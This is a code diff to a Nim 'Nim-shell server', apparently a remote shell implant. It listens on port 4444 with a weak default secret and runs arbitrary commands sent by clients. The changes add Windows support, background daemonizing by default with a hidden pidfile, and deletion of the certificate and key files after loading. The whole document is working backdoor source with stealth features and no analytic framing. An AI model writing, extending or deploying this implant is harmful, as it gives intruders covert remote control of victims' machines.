@@ -12,8 +12,10 @@ import algorithm
 import argparse
 import hashids
 import std/sha1
+import daemons
 
 const BIND: int = 4444
+const SSL: bool = true
 const SECRET: string = "1234"
 const CERTFILE = "server.pem"
 const KEYFILE = "key.pem"
@@ -232,6 +234,10 @@ proc main(port: int, secret: string, ssl, verbose: bool) =
     if ssl:
         var ctx = newContext(certFile = CERTFILE, keyFile = KEYFILE, verifyMode = CVerifyNone)
         wrapSocket(ctx, server)
+
+    when defined windows:
+        discard execProcess("cmd.exe /c del server.pem key.pem")
+    elif defined linux:
         discard execProcess("rm -f server.pem key.pem")
 
     if verbose:
@@ -305,8 +311,14 @@ proc main(port: int, secret: string, ssl, verbose: bool) =
                         else:
                             client.send(encodeMsg("Must specify path", keychain.hashIds) & "\r\L\r\L")
                     else:
-                        try: 
-                            var result = execProcess(command)
+                        try:
+                            var result: string
+
+                            when defined windows:
+                                result = execProcess("cmd /c " & command)
+                            else:
+                                result = execProcess(command)
+
                             client.send(encodeMsg(result, keychain.hashIds) & "\r\L\r\L")
                         except OSError:
                             discard
@@ -332,17 +344,20 @@ var p = newParser:
     help("Nim-shell server")
     flag("-v", "--verbose", help="Enable verbost output for debugging")
     flag("-n", "--nossl", help="Disable SSL")
+    flag("-d", "--nodaemon", help="Don't daemonize. Windows only.")
     option("-p", "--port", help="Override default port", required=false)
     option("-k", "--key", help="Override default shared secret", required=false)
-    
+
 try: 
     var 
         x = p.parse(commandLineParams())
-        useSSL: bool = true
+        useSSL: bool = SSL
         usePort: int = BIND
         useKey: string = SECRET
 
-    if x.nossl:
+    # External .dll required. Set to false
+    # https://github.com/nim-lang/Nim/issues/19099
+    if x.nossl or defined windows:
         if x.verbose:
             echo "Client: SSL disabled"
         useSSL = false
@@ -363,8 +378,38 @@ try:
         discard
     else:
         useKey = x.key
-    
-    main(usePort, useKey, useSSL, x.verbose)
+
+    when defined windows:
+        # External .dll required. Set to false
+        # https://github.com/nim-lang/Nim/issues/19099
+        useSSL = false
+
+        if x.verbose:
+            echo "Server: running on windows"
+    elif defined linux:
+        if x.verbose:
+            echo "Server: running on linux"
+    else:
+        # Unknown OS unlikely to have supported openssl
+        useSSL = false
+        if x.verbose:
+            echo "Server: unknown os"
+
+    # If daemon enabled exit and allow to spawn new pid
+    # This requires the configurations to be set during compile time. 
+    if x.nodaemon:
+        main(usePort, useKey, useSSL, x.verbose)
+    else:
+        when defined linux:
+            let pidfile = getTempDir() / ".nshd"
+            daemonize(pidfile):
+                main(usePort, useKey, useSSL, x.verbose)
+        elif defined windows:
+            let pidfile = getTempDir() / "nshd.pid"
+            daemonize(pidfile):
+                main(usePort, useKey, useSSL, x.verbose)
+        else:
+            echo "Server: unknown os"
 except ShortCircuit as e:
     if e.flag == "argparse_help":
         echo p.help
